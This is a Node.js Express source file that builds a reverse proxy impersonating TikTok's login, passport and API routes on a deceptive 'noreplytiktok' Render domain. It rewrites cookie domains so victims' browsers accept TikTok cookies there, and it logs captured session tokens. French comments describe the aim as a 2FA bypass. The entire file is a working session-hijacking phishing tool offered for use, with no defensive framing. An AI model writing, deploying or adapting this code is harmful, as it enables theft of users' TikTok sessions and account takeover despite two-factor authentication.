const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cookieParser());
app.use(express.static(path.join(__dirname)));

const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    // CRITIQUE : Permet au navigateur d'accepter les cookies de TikTok sur ton domaine Render
    cookieDomainRewrite: {
        ".tiktok.com": "noreplytiktok.onrender.com",
        "tiktok.com": "noreplytiktok.onrender.com"
    },
    onProxyRes: function (proxyRes, req, res) {
        const setCookie = proxyRes.headers['set-cookie'];
        if (setCookie) {
            console.log("\n[!] INTERCEPTION HEADERS - SESSION EN COURS");
            setCookie.forEach(cookie => {
                // On logue tout ce qui ressemble à un identifiant de session (2FA bypass)
                if (cookie.includes('sessionid') || cookie.includes('ttwid') || cookie.includes('sid')) {
                    console.log(">>> JETON CAPTURÉ : " + cookie.split(';')[0]);
                }
            });
            console.log("------------------------------------------\n");
        }
    },
    onProxyReq: function (proxyReq, req, res) {
        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
        proxyReq.setHeader('Origin', 'https://www.tiktok.com');
    }
};

const proxy = createProxyMiddleware(proxyOptions);

// Routes cruciales pour l'authentification TikTok
app.use('/api/', proxy);
app.use('/passport/', proxy);
app.use('/login/', proxy);

app.listen(PORT, () => {
    console.log("BACOPS PROXY SYNC - PORT " + PORT);
});
